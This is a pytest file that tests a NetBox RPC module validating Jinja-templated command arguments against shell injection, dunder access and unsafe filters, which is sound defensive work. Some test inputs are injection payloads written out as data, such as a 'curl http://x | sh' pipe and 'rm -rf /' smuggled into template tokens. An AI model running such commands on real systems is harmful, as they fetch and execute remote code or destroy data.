"""Pure-domain tests for ``netbox_rpc.command_templating``.

Loaded via ``importlib`` (like ``tests/test_command_contract.py``) so the module
is exercised without importing the Django-heavy ``netbox_rpc`` package. Requires
only ``jinja2`` (installed in CI); NetBox ships it in production.
"""

import importlib.util
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location(
    "command_templating",
    ROOT / "netbox_rpc/command_templating.py",
)
assert SPEC and SPEC.loader
command_templating = importlib.util.module_from_spec(SPEC)
sys.modules["command_templating"] = command_templating
SPEC.loader.exec_module(command_templating)

analyze_token = command_templating.analyze_token
validate_jinja_argv = command_templating.validate_jinja_argv
validate_capture = command_templating.validate_capture
VarRef = command_templating.VarRef

PARAMS = frozenset({"vlan_id", "service_slug"})
NO_VARS: frozenset[str] = frozenset()


# ── jinja2 availability ──────────────────────────────────────────────────────


def test_jinja2_is_available_for_validation() -> None:
    # The whole feature depends on Jinja2 being importable where validation runs.
    assert command_templating._JINJA_AVAILABLE is True


# ── analyze_token: reference extraction ──────────────────────────────────────


def test_analyze_token_extracts_first_level_references() -> None:
    analysis = analyze_token("desc={{ target.name }}-{{ vars.vmid }}")
    assert analysis.errors == []
    assert VarRef("target", "name") in analysis.refs
    assert VarRef("vars", "vmid") in analysis.refs


def test_analyze_token_handles_subscript_and_bare_and_nested() -> None:
    assert VarRef("params", "vlan_id") in analyze_token("{{ params['vlan_id'] }}").refs
    assert VarRef("item", None) in analyze_token("{{ item }}").refs
    # Only the FIRST attribute of a deep chain is recorded.
    assert VarRef("target", "primary_ip") in analyze_token("{{ target.primary_ip.address }}").refs


def test_analyze_token_plain_literal_has_no_refs() -> None:
    analysis = analyze_token("write_memory")
    assert analysis.errors == []
    assert analysis.refs == []


# ── analyze_token: structural rejections (security) ──────────────────────────


def test_analyze_token_rejects_statement_and_comment_blocks() -> None:
    assert analyze_token("{% for x in y %}{{ x }}{% endfor %}").errors
    assert analyze_token("{# comment #}value").errors


def test_analyze_token_rejects_function_and_method_calls() -> None:
    assert analyze_token("{{ target.name.upper() }}").errors
    assert analyze_token("{{ range(3) }}").errors


def test_analyze_token_rejects_unsafe_literal_span() -> None:
    # Shell metacharacters in the literal text outside the expression.
    assert analyze_token("foo;rm -rf /{{ x }}").errors
    assert analyze_token("a|b").errors


def test_analyze_token_rejects_syntax_error() -> None:
    assert analyze_token("{{ unterminated ").errors


def test_shell_text_hidden_in_string_literal_is_rejected() -> None:
    # A string constant inside {{ }} must also obey the safe argv charset, so
    # shell metacharacters can't be smuggled past the literal-span check.
    assert analyze_token("{{ '; curl http://x | sh #' }}").errors
    assert analyze_token('{{ "a b; rm -rf /" }}').errors


def test_safe_string_literals_and_concat_are_allowed() -> None:
    assert validate_jinja_argv(
        ["{{ target.name ~ '-suffix' }}"],
        param_names=PARAMS, produced_vars=NO_VARS, for_each_present=False,
    ) == []
    assert validate_jinja_argv(
        ["{{ params.vlan_id | default('none') }}"],
        param_names=PARAMS, produced_vars=NO_VARS, for_each_present=False,
    ) == []


def test_deep_dunder_access_is_rejected() -> None:
    # Private/dunder access at any depth, via attribute or subscript.
    assert analyze_token("{{ target.name.__class__ }}").errors
    assert analyze_token("{{ target['_secret'] }}").errors
    assert analyze_token("{{ target.a.b._c }}").errors


def test_filter_allowlist_permits_safe_and_rejects_attribute_reaching() -> None:
    assert validate_jinja_argv(
        ["{{ vars.vmid | int }}"],
        param_names=PARAMS, produced_vars=frozenset({"vmid"}), for_each_present=False,
    ) == []
    # `attr` and `map` can reach arbitrary attributes — rejected.
    assert analyze_token("{{ target.x | attr('__class__') }}").errors
    assert analyze_token("{{ params.items | map('upper') }}").errors


# ── validate_jinja_argv: semantic resolution + chain ordering ────────────────


def test_valid_chain_resolves_params_target_vars() -> None:
    errors = validate_jinja_argv(
        [
            "/bin/set",
            "--id",
            "{{ vars.vmid }}",
            "--vlan",
            "{{ params.vlan_id }}",
            "--host",
            "{{ target.name }}",
        ],
        param_names=PARAMS,
        produced_vars=frozenset({"vmid"}),
        for_each_present=False,
    )
    assert errors == []


def test_output_variable_referenced_before_produced_is_rejected() -> None:
    # This is THE nesting-chain invariant: vars.<x> must be produced earlier.
    errors = validate_jinja_argv(
        ["x{{ vars.notyet }}"],
        param_names=PARAMS,
        produced_vars=NO_VARS,
        for_each_present=False,
    )
    assert errors and "not produced by any earlier command" in errors[0]


def test_unknown_param_is_rejected() -> None:
    errors = validate_jinja_argv(
        ["{{ params.nope }}"],
        param_names=PARAMS,
        produced_vars=NO_VARS,
        for_each_present=False,
    )
    assert errors and "not declared in the procedure params schema" in errors[0]


def test_unknown_runtime_key_is_rejected_but_known_key_passes() -> None:
    assert validate_jinja_argv(
        ["{{ runtime.rpc_ssh_host }}"],
        param_names=PARAMS,
        produced_vars=NO_VARS,
        for_each_present=False,
    ) == []
    assert validate_jinja_argv(
        ["{{ runtime.evil }}"],
        param_names=PARAMS,
        produced_vars=NO_VARS,
        for_each_present=False,
    )


def test_unknown_root_is_rejected() -> None:
    errors = validate_jinja_argv(
        ["{{ secrets.token }}"],
        param_names=PARAMS,
        produced_vars=NO_VARS,
        for_each_present=False,
    )
    assert errors and "unknown variable root" in errors[0]


def test_dunder_attribute_access_is_rejected() -> None:
    errors = validate_jinja_argv(
        ["{{ target.__class__ }}"],
        param_names=PARAMS,
        produced_vars=NO_VARS,
        for_each_present=False,
    )
    assert errors and "private/dunder" in errors[0]


def test_target_fields_are_permissive() -> None:
    # target.<field> is accepted for any non-dunder field (resolved at run time).
    assert validate_jinja_argv(
        ["{{ target.serial }}", "{{ target.asset_tag }}"],
        param_names=PARAMS,
        produced_vars=NO_VARS,
        for_each_present=False,
    ) == []


def test_whole_context_object_reference_is_rejected() -> None:
    for token in ("{{ params }}", "{{ target }}", "{{ vars }}", "{{ runtime }}"):
        errors = validate_jinja_argv(
            [token], param_names=PARAMS, produced_vars=frozenset({"x"}),
            for_each_present=False,
        )
        assert errors, f"{token} should be rejected"


def test_item_requires_for_each() -> None:
    assert validate_jinja_argv(
        ["{{ item }}"], param_names=PARAMS, produced_vars=NO_VARS, for_each_present=False
    )
    assert validate_jinja_argv(
        ["{{ item }}"], param_names=PARAMS, produced_vars=NO_VARS, for_each_present=True
    ) == []


def test_empty_argv_is_rejected() -> None:
    assert validate_jinja_argv(
        [], param_names=PARAMS, produced_vars=NO_VARS, for_each_present=False
    )
    assert validate_jinja_argv(
        "notalist", param_names=PARAMS, produced_vars=NO_VARS, for_each_present=False
    )


# ── validate_capture ─────────────────────────────────────────────────────────


def test_capture_stdout_and_stripped_need_no_expression() -> None:
    assert validate_capture(
        produces_var="vmid", capture_kind="stdout", capture_expression="",
        other_var_names=NO_VARS,
    ) == []
    assert validate_capture(
        produces_var="vmid", capture_kind="stdout_stripped", capture_expression="",
        other_var_names=NO_VARS,
    ) == []


def test_capture_regex_requires_exactly_one_group() -> None:
    assert validate_capture(
        produces_var="vmid", capture_kind="regex", capture_expression=r"VMID:(\d+)",
        other_var_names=NO_VARS,
    ) == []
    assert validate_capture(
        produces_var="vmid", capture_kind="regex", capture_expression=r"VMID:\d+",
        other_var_names=NO_VARS,
    )  # zero groups
    assert validate_capture(
        produces_var="vmid", capture_kind="regex", capture_expression=r"(a)(b)",
        other_var_names=NO_VARS,
    )  # two groups
    assert validate_capture(
        produces_var="vmid", capture_kind="regex", capture_expression=r"(",
        other_var_names=NO_VARS,
    )  # invalid regex


def test_capture_line_requires_integer() -> None:
    assert validate_capture(
        produces_var="v", capture_kind="line", capture_expression="0",
        other_var_names=NO_VARS,
    ) == []
    assert validate_capture(
        produces_var="v", capture_kind="line", capture_expression="first",
        other_var_names=NO_VARS,
    )


def test_capture_expression_forbidden_without_matching_kind() -> None:
    assert validate_capture(
        produces_var="v", capture_kind="stdout", capture_expression="oops",
        other_var_names=NO_VARS,
    )


def test_capture_requires_var_for_kind_or_expression() -> None:
    assert validate_capture(
        produces_var="", capture_kind="regex", capture_expression="x",
        other_var_names=NO_VARS,
    )
    # Fully empty capture spec is valid (a command need not produce a var).
    assert validate_capture(
        produces_var="", capture_kind="", capture_expression="", other_var_names=NO_VARS
    ) == []


def test_capture_var_name_must_be_snake_case_unique_and_not_reserved() -> None:
    assert validate_capture(
        produces_var="Bad-Name", capture_kind="stdout", capture_expression="",
        other_var_names=NO_VARS,
    )
    assert validate_capture(
        produces_var="vmid", capture_kind="stdout", capture_expression="",
        other_var_names=frozenset({"vmid"}),
    )
    assert validate_capture(
        produces_var="target", capture_kind="stdout", capture_expression="",
        other_var_names=NO_VARS,
    )


def test_capture_kind_required_when_var_set() -> None:
    assert validate_capture(
        produces_var="vmid", capture_kind="", capture_expression="",
        other_var_names=NO_VARS,
    )
